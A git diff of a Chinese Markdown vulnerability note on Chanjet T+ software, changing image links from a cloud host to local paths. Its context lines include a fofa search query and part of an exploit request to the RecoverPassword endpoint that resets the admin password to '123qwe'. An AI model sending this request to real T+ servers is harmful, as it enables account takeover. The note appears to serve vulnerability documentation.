@@ -20,7 +20,7 @@ app="畅捷通-TPlus"
 
 登录页面
 
-![image-20220909104559292](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202209091048224.png)
+![image-20220909104559292](./images/202209091048224.png)
 
 验证POC, 重置账号密码为 `admin/123qwe`
 
@@ -30,4 +30,4 @@ POST /tplus/ajaxpro/RecoverPassword,App_Web_recoverpassword.aspx.cdcab7d2.ashx?m
 {"pwdNew":"46f94c8de14fb36680850768ff1b7f2a"}
 ```
 
-![image-20220909104816391](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202209091048450.png)
+![image-20220909104816391](./images/202209091048450.png)
